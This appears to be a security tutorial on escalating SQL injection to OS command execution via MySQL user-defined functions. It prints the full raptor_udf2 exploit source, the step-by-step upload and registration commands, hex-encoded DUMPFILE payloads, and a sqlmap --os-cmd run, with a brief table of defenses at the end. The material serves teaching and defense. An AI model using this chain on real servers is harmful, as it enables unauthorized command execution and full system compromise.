# 37 - SQL Injection to OS Command Execution via UDF

## User Defined Functions (UDF) — The Ultimate Escalation

When `INTO OUTFILE` web shell writing isn't possible (no web root access, no PHP), attackers can use MySQL's **User Defined Functions** to execute OS commands directly from SQL.

```sql
CREATE FUNCTION f_name RETURNS INTEGER SONAME shared_library
```

MySQL allows loading custom functions from shared libraries (`.so` on Linux, `.dll` on Windows). If the attacker can upload a malicious shared library, they can register it as a UDF and call OS commands from SQL.

## raptor_udf2 — Classic UDF Exploit

### The C Source Code

```c
/*
 * raptor_udf2.c - dynamic library for do_system() MySQL UDF
 * Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Helper dynamic library for local privilege escalation through
 * MySQL run with root privileges (very bad idea!).
 */

#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
    unsigned int      arg_count;      // number of arguments
    enum Item_result  *arg_type;      // pointer to item_result
    char              **args;         // pointer to arguments
    unsigned long     *lengths;       // length of string args
    char              *maybe_null;    // 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
    char              maybe_null;     // 1 if func can return NULL
    unsigned int      decimals;       // for real functions
    unsigned long     max_length;     // for string functions
    char              *ptr;           // free ptr for func data
    char              const_item;     // 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
    if (args->arg_count != 1)
        return(0);

    system(args->args[0]);    // <-- THE KEY LINE: calls libc system()

    return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
    return(0);
}
```

**The entire exploit is just a wrapper around `system()`.** The `do_system()` function takes one argument (a command string) and passes it to the C `system()` function, which executes it as a shell command.

`do_system_init()` is required by MySQL's UDF interface — it's called once when the function is first loaded. Here it does nothing (returns 0 = success).

### The Attack Flow — Step by Step

```
Step 1: Compile the shared library
$ gcc -g -c raptor_udf2.c
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

Step 2: Upload it via MySQL (using SQL injection)
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';

Step 3: Register the UDF
mysql> create function do_system returns integer soname 'raptor_udf2.so';

Step 4: Execute commands as the MySQL user
mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');

Step 5: Read the output
$ cat /tmp/out
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
```

### Breaking Down Step 2 — The Upload Trick

The attacker can't directly upload files to the server, but MySQL can:

```sql
create table foo(line blob);                                    -- temp table for binary data
insert into foo values(load_file('/home/raptor/raptor_udf2.so'));  -- read .so into table
select * from foo into dumpfile '/usr/lib/raptor_udf2.so';      -- write .so to MySQL's lib dir
```

**Via SQL injection**, the attacker can also upload the binary by:
1. Hex-encoding the `.so` file contents
2. Using `UNION SELECT UNHEX('7f454c46...') INTO DUMPFILE '/usr/lib/evil.so'`
3. The entire shared library is embedded in the SQL query as a hex string

### Why the Output Goes to a File

`do_system()` returns an integer (0), not the command output. So the attacker redirects output to a file:

```sql
select do_system('id > /tmp/out');       -- write output to file
select do_system('cat /tmp/out');        -- won't show in SQL result!
```

Then reads `/tmp/out` via `LOAD_FILE('/tmp/out')` in a subsequent injection.

## lib_mysqludf_sys — A More Complete UDF Library

The sqlmap project provides a pre-built UDF library with two functions:

```bash
$ wget https://svn.sqlmap.org/sqlmap/trunk/sqlmap/extra/mysqludfsys/lib_mysqludf_sys_0.0.3.tar.gz
$ tar xfz lib_mysqludf_sys_0.0.3.tar.gz
$ cd lib_mysqludf_sys_0.0.3
$ sudo ./install.sh
```

### sys_eval — Returns Command Output

```sql
mysql> SELECT sys_eval('id');
+--------------------------------------------------+
| sys_eval('id')                                   |
+--------------------------------------------------+
| uid=118(mysql) gid=128(mysql) groups=128(mysql)  |
+--------------------------------------------------+
```

Unlike `do_system()`, `sys_eval()` **returns the command output as a string** — no need to redirect to a file and read it back. The output appears directly in the SQL result set.

### sys_exec — Returns Exit Code

```sql
mysql> SELECT sys_exec('touch /tmp/test_mysql');
+-----------------------------------+
| sys_exec('touch /tmp/test_mysql') |
+-----------------------------------+
| 0                                 |
+-----------------------------------+

$ ls -l /tmp/test_mysql
-rw-rw---- 1 mysql mysql 0 2009-01-16 23:18 /tmp/test_mysql
```

Returns the command's exit code (0 = success). The file is owned by `mysql` — the command runs as the MySQL process user.

## sqlmap — Automated UDF Exploitation

sqlmap automates the entire UDF attack chain:

```bash
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" \
    --os-cmd id -v 1
```

```
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: PostgreSQL
[INFO] the back-end DBMS operating system is Linux
[INFO] testing if current user is DBA
[INFO] checking if UDF 'sys_eval' already exist
[INFO] checking if UDF 'sys_exec' already exist
[INFO] creating UDF 'sys_eval' from the binary UDF file
[INFO] creating UDF 'sys_exec' from the binary UDF file

do you want to retrieve the command standard output? [Y/n] y
command standard output: 'uid=104(postgres) gid=106(postgres) groups=106(postgres)'

[INFO] cleaning up the database management system
do you want to remove UDF 'sys_eval'? [Y/n] y
do you want to remove UDF 'sys_exec'? [Y/n] y
[WARNING] remember that UDF shared object files saved on the file system can
only be deleted manually
```

### What sqlmap Does Automatically

1. **Detects the DBMS** — PostgreSQL in this case (UDFs work on both MySQL and PostgreSQL)
2. **Checks DBA privileges** — UDF creation requires admin-level database access
3. **Uploads the UDF shared library** — via hex-encoded SQL injection
4. **Registers the functions** — `CREATE FUNCTION sys_eval/sys_exec`
5. **Executes the command** — `SELECT sys_eval('id')`
6. **Cleans up** — removes the UDF registrations (but warns that the `.so` file remains on disk)

### The Escalation Chain

```
SQL Injection
  → Detect DBMS type and version
    → Check if user has DBA/FILE privileges
      → Upload UDF shared library (hex-encoded via DUMPFILE)
        → CREATE FUNCTION registers the .so
          → SELECT sys_eval('command') = OS command execution
            → Commands run as the database process user (mysql/postgres)
              → If DB runs as root → full system compromise
```

## Defenses

| Defense | What it prevents |
|---------|-----------------|
| **Never run MySQL as root** | UDF commands execute as the DB user — non-root limits damage |
| **Revoke `FILE` privilege** | Blocks LOAD_FILE, INTO OUTFILE/DUMPFILE — can't upload .so files |
| **Revoke `CREATE FUNCTION` privilege** | Can't register UDFs even if .so is uploaded |
| **`secure_file_priv`** | Restricts file I/O to a specific directory (or disables it entirely) |
| **Parameterized queries** | Prevents SQL injection entirely — the root cause |
